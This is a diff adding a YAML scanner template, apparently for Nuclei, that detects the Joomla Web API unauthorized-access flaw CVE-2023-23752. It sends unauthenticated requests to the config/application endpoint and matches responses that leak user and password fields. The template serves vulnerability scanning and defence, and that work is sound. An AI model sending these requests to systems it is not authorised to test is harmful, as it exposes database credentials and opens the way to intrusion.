@@ -1,0 +1,54 @@
+id: joomla-webapi-unauthorized-access
+info:
+  name: Joomla Web API Unauthorized Access Vulnerability (CVE-2023-23752)
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Joomla is a free and open-source content management system (CMS) for publishing web content. Attackers can control the entire system through unauthorized access vulnerabilities, leading to an extremely insecure state of the system.
+  tags: unauthorized-access, information-disclosure
+  classification:
+    cve-id: CVE-2023-23752
+    cvss-score: 7.8
+
+http:
+  - raw:
+      - |
+        GET /api/index.php/v1/config/application?public=true&page%5Boffset%5D=20&page%5Blimit%5D=2000 HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+        Accept: */*
+        Accept-Language: en
+        Accept-Encoding: gzip, deflate
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "links"
+          - "\"attributes\":"
+          - "user"
+          - "password"
+
+  - raw:
+      - |
+        GET /api/index.php/v1/config/application?public=true HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+        Accept: */*
+        Accept-Language: en
+        Accept-Encoding: gzip, deflate
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "links"
+          - "\"attributes\":"
+          - "user"
+          - "password"
